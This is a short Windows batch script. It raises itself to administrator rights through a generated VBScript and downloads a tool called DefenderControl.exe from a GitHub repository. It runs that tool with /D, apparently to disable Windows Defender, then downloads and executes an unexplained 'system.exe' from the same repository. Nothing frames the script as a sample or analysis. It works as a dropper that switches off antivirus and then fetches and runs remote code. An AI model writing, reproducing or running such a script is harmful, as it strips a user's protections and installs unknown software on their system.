set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

cd %tmp%
del  DefenderControl.exe
wget https://github.com/souledu/lullu/raw/main/DefenderControl.exe
DefenderControl.exe /D

timeout 3 > NUL

del system.exe
wget https://github.com/souledu/lullu/raw/main/system.exe  && system.exe
exit
